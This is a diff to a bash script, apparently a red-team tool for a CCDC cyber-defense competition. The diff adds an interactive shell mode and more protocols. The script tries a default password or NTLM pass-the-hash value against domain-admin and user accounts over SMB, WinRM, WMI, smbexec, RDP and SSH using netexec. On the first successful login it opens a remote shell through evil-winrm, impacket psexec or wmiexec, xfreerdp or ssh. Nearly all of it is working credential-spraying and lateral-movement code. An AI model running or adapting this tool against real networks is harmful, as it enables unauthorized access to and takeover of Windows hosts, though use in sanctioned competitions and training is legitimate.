@@ -1,28 +1,36 @@
 #!/bin/bash
 # ================================================
 # CCDC Remote Exec Script
-# Usage: ./exec.sh <team> [host] [-c "command"] [-p pass_or_hash]
+# Usage: ./exec.sh <team> [host] [-c "command"] [-p pass_or_hash] [-s]
 #
 #   host  → hostname (curiosity), number (1-7), or omit to list
 #   -c    → command to run (default: whoami /all)
 #   -p    → password or NTLM hash (default: Th3cake1salie!)
+#   -s    → shell mode: drop into interactive shell on first hit
 #
 #   Tries DA accounts first, then falls back to all users in users.txt
-#   Tries WinRM first, then SMB, then smbexec
+#   Order: SMB → WinRM → WMI → smbexec → RDP → SSH
+#   WMI: tries domain auth; falls back to local auth if SMB port closed
 # ================================================
 
 usage() {
-  echo "Usage: $0 <team> [host] [-c \"command\"] [-p password_or_hash]"
+  echo "Usage: $0 <team> [host] [-c \"command\"] [-p password_or_hash] [-s]"
   echo ""
   echo "  host can be:"
   echo "    hostname  — curiosity, morality, intelligence, anger, fact, space, adventure"
   echo "    number    — 1=curiosity 2=morality 3=intelligence 4=anger 5=fact 6=space 7=adventure"
+  echo ""
+  echo "Flags:"
+  echo "  -c CMD   command to run remotely (default: whoami /all)"
+  echo "  -p PASS  password or NTLM hash"
+  echo "  -s       shell mode — drop into interactive shell on first successful auth"
   echo ""
   echo "Examples:"
   echo "  $0 5                               # list all boxes"
   echo "  $0 5 1                             # whoami on curiosity (DC)"
   echo "  $0 5 anger -c \"ipconfig\""
   echo "  $0 5 3 -c \"net user\" -p Th3cake1salie!"
+  echo "  $0 5 curiosity -s                  # drop into shell"
   echo "  $0 5 curiosity -p aad3b435b51404eeaad3b435b51404ee:0aa78d8d13abad46a59ef0a63f6ae924"
   exit 1
 }
@@ -36,6 +44,7 @@ if [[ -z "$TEAM" || ! "$TEAM" =~ ^[0-9]+$ ]]; then usage; fi
 DOMAIN="aperturesciencelabs.org"
 PASS="Th3cake1salie!"
 CMD="whoami /all"
+SHELL_MODE=0
 TARGET_ARG=""
 
 # Grab optional positional host arg (before any flags)
@@ -43,13 +52,19 @@ if [[ $# -gt 0 && "$1" != -* ]]; then
   TARGET_ARG="$1"; shift
 fi
 
-while getopts "p:c:" opt; do
+while getopts "p:c:s" opt; do
   case "$opt" in
     p) PASS="$OPTARG" ;;
     c) CMD="$OPTARG" ;;
+    s) SHELL_MODE=1 ;;
     *) usage ;;
   esac
 done
+
+# In shell mode use a harmless probe so try_* functions still verify auth
+if [[ $SHELL_MODE -eq 1 ]]; then
+  CMD="echo __probe__"
+fi
 
 # ====================== HOST MAPPING ======================
 # Number → hostname
@@ -152,10 +167,86 @@ else
   echo "[!] users.txt not found — using DA list only"
 fi
 
+# ====================== PORT PRE-CHECK ======================
+TIMEOUT=2
+port_open() {
+  local ip="$1" port="$2"
+  timeout "$TIMEOUT" bash -c "echo >/dev/tcp/$ip/$port" 2>/dev/null
+}
+
+SMB_UP=0
+if port_open "$IP" 445; then
+  SMB_UP=1
+fi
+
 echo "[+] Target : ${FQDN} (${IP})"
-echo "[+] Command: ${CMD}"
+if [[ $SHELL_MODE -eq 1 ]]; then
+  echo "[+] Mode   : SHELL (interactive)"
+else
+  echo "[+] Command: ${CMD}"
+fi
+echo "[+] SMB    : $([ $SMB_UP -eq 1 ] && echo 'open' || echo 'closed')"
 echo "[+] Users  : ${#ALL_USERS[@]} total (${#DA_USERS[@]} DA + $((${#ALL_USERS[@]}-${#DA_USERS[@]})) from users.txt)"
 echo ""
+
+# ====================== SHELL OPENER ======================
+# Called in shell mode after a protocol auth succeeds.
+# Uses exec so the process is replaced by the interactive session.
+# Returns 1 if the required binary is missing (caller can try next proto).
+open_shell() {
+  local proto="$1" user="$2"
+  echo "[*] Opening $proto shell as $user on ${FQDN} ..."
+  case "$proto" in
+    winrm)
+      if command -v evil-winrm >/dev/null 2>&1; then
+        if [[ "$AUTH_FLAG" == "-H" ]]; then
+          exec evil-winrm -i "$IP" -u "$user" -H "$PASS"
+        else
+          exec evil-winrm -i "$IP" -u "$user" -p "$PASS"
+        fi
+      fi
+      echo "[-] evil-winrm not found — skipping WinRM shell"
+      return 1
+      ;;
+    smb)
+      local psexec_bin
+      psexec_bin=$(command -v psexec.py 2>/dev/null || command -v impacket-psexec 2>/dev/null || echo "")
+      if [[ -n "$psexec_bin" ]]; then
+        if [[ "$AUTH_FLAG" == "-H" ]]; then
+          exec "$psexec_bin" "${DOMAIN}/${user}@${FQDN}" -hashes "$PASS" -dc-ip "$IP" -target-ip "$IP"
+        else
+          exec "$psexec_bin" "${DOMAIN}/${user}:${PASS}@${FQDN}" -dc-ip "$IP" -target-ip "$IP"
+        fi
+      fi
+      echo "[-] psexec not found — skipping SMB shell"
+      return 1
+      ;;
+    wmi)
+      local wmiexec_bin
+      wmiexec_bin=$(command -v wmiexec.py 2>/dev/null || command -v impacket-wmiexec 2>/dev/null || echo "")
+      if [[ -n "$wmiexec_bin" ]]; then
+        if [[ "$AUTH_FLAG" == "-H" ]]; then
+          exec "$wmiexec_bin" "${DOMAIN}/${user}@${FQDN}" -hashes "$PASS" -dc-ip "$IP" -target-ip "$IP"
+        else
+          exec "$wmiexec_bin" "${DOMAIN}/${user}:${PASS}@${FQDN}" -dc-ip "$IP" -target-ip "$IP"
+        fi
+      fi
+      echo "[-] wmiexec not found — skipping WMI shell"
+      return 1
+      ;;
+    rdp)
+      if command -v xfreerdp >/dev/null 2>&1; then
+        exec xfreerdp /v:"$IP" /u:"$user" /d:"$DOMAIN" /p:"$PASS" \
+          +clipboard /dynamic-resolution /cert:ignore 2>/dev/null
+      fi
+      echo "[-] xfreerdp not found — skipping RDP shell"
+      return 1
+      ;;
+    ssh)
+      exec ssh -o StrictHostKeyChecking=no "${user}@${IP}"
+      ;;
+  esac
+}
 
 # ====================== EXEC FUNCTIONS ======================
 # Each returns 0 on success, 1 on failure
@@ -213,25 +304,146 @@ try_smbexec() {
   return 1
 }
 
+try_wmi() {
+  local user="$1"
+  local out
+
+  # 1) Try domain auth first
+  out=$(netexec wmi "$IP" \
+    -u "$user" -d "$DOMAIN" "$AUTH_FLAG" "$PASS" \
+    -x "$CMD" 2>&1)
+  if echo "$out" | grep -q '\[+\]'; then
+    echo "[+] WMI(domain) SUCCESS → $user"
+    echo "$out" | grep -v '^\[-\]\|^\[*\]' | grep -v '^$'
+    return 0
+  fi
+
+  # 2) If SMB is down, also try local auth (no domain / --local-auth)
+  if [[ $SMB_UP -eq 0 ]]; then
+    out=$(netexec wmi "$IP" \
+      -u "$user" "$AUTH_FLAG" "$PASS" \
+      --local-auth \
+      -x "$CMD" 2>&1)
+    if echo "$out" | grep -q '\[+\]'; then
+      echo "[+] WMI(local) SUCCESS → $user"
+      echo "$out" | grep -v '^\[-\]\|^\[*\]' | grep -v '^$'
+      return 0
+    fi
+  fi
+
+  return 1
+}
+
+try_rdp() {
+  local user="$1"
+  local out
+
+  out=$(netexec rdp "$IP" \
+    -u "$user" -d "$DOMAIN" "$AUTH_FLAG" "$PASS" \
+    2>&1)
+  if echo "$out" | grep -q '\[+\]'; then
+    echo "[+] RDP SUCCESS → $user"
+    echo "$out" | grep -v '^\[-\]\|^\[*\]' | grep -v '^$'
+    return 0
+  fi
+  return 1
+}
+
+try_ssh() {
+  local user="$1"
+  # SSH only supports password auth here (no hash)
+  if [[ "$AUTH_FLAG" == "-H" ]]; then
+    return 1
+  fi
+
+  if ! port_open "$IP" 22; then
+    return 1
+  fi
+
+  local out
+  out=$(netexec ssh "$IP" \
+    -u "$user" -p "$PASS" \
+    -x "$CMD" 2>&1)
+  if echo "$out" | grep -q '\[+\]'; then
+    echo "[+] SSH SUCCESS → $user"
+    echo "$out" | grep -v '^\[-\]\|^\[*\]' | grep -v '^$'
+    return 0
+  fi
+  return 1
+}
+
 # ====================== MAIN LOOP ======================
 SUCCESS=0
+
+try_and_maybe_shell() {
+  local proto="$1" user="$2"
+  local fn="try_${proto//-/_}"
+
+  if $fn "$user"; then
+    SUCCESS=1
+    if [[ $SHELL_MODE -eq 1 ]]; then
+      open_shell "$proto" "$user" || return 1  # binary missing — keep trying
+    fi
+    return 0
+  fi
+  return 1
+}
 
 for USER in "${ALL_USERS[@]}"; do
   printf "[*] %-20s " "$USER"
 
-  # 1. Try WinRM
-  if try_winrm "$USER"; then
-    SUCCESS=1; break
-  fi
-
-  # 2. Try SMB -x (cmd execution)
+  # 1. SMB
   if try_smb_x "$USER"; then
-    SUCCESS=1; break
+    SUCCESS=1
+    if [[ $SHELL_MODE -eq 1 ]]; then
+      open_shell smb "$USER" || { SUCCESS=0; echo "→ shell unavailable, continuing"; }
+    fi
+    [[ $SUCCESS -eq 1 ]] && break
   fi
 
-  # 3. Try smbexec (impacket)
+  # 2. WinRM
+  if try_winrm "$USER"; then
+    SUCCESS=1
+    if [[ $SHELL_MODE -eq 1 ]]; then
+      open_shell winrm "$USER" || { SUCCESS=0; echo "→ shell unavailable, continuing"; }
+    fi
+    [[ $SUCCESS -eq 1 ]] && break
+  fi
+
+  # 3. WMI (domain + local auth fallback)
+  if try_wmi "$USER"; then
+    SUCCESS=1
+    if [[ $SHELL_MODE -eq 1 ]]; then
+      open_shell wmi "$USER" || { SUCCESS=0; echo "→ shell unavailable, continuing"; }
+    fi
+    [[ $SUCCESS -eq 1 ]] && break
+  fi
+
+  # 4. smbexec (impacket)
   if try_smbexec "$USER"; then
-    SUCCESS=1; break
+    SUCCESS=1
+    if [[ $SHELL_MODE -eq 1 ]]; then
+      open_shell smb "$USER" || { SUCCESS=0; echo "→ shell unavailable, continuing"; }
+    fi
+    [[ $SUCCESS -eq 1 ]] && break
+  fi
+
+  # 5. RDP
+  if try_rdp "$USER"; then
+    SUCCESS=1
+    if [[ $SHELL_MODE -eq 1 ]]; then
+      open_shell rdp "$USER" || { SUCCESS=0; echo "→ shell unavailable, continuing"; }
+    fi
+    [[ $SUCCESS -eq 1 ]] && break
+  fi
+
+  # 6. SSH
+  if try_ssh "$USER"; then
+    SUCCESS=1
+    if [[ $SHELL_MODE -eq 1 ]]; then
+      open_shell ssh "$USER" || { SUCCESS=0; echo "→ shell unavailable, continuing"; }
+    fi
+    [[ $SUCCESS -eq 1 ]] && break
   fi
 
   echo "→ no access"
